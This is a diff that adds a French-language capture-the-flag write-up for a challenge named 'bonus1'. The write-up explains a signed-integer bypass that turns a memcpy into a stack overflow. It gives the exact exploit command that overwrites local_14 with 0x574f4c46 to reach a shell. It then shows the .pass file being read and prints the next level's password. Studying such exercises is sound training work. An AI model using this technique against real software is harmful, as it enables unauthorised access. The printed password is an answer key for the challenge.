@@ -1,0 +1,20 @@
+Bonus1: 
+
+idee : Il y a dans le programme deux conditions d'affilée : une première ou local_14 doit être < 10 puis une seconde ou local_14 doit être == 0x574f4c46 (1464814662) est faite. Entre ces deux conditions, un memcpy non protege : memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
+pour rappel : void *memcpy(void *dest, const void * src, size_t n)
+La première condition → local_14 = atoi(argv[1])
+le memcpy met argv[2] dans local_3c (avec une longueur de 4 * local_14)). 
+Comme local_3c est avant local_14 dans la strack on va pouvoir re écraser local 14 grâce au memcpy. 
+Le problème est que dans le première condition il faut local_14 < 10.
+Solution : memcpy prend des unsigned long : 
+
+exemple avec ltrace ./bonus1 -1 test
+memcpy(0xbffff714, "test", 4294967292 <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
+
+40 bytes séparent le local_3c de local_14. On offset de 40 puis on rajoute “0x574f4c46” pour écraser local_14 et pouvoir rentrer dans le deuxième condition qui ouvrira un shell
+
+./bonus1 "-2147483637" $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
+cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
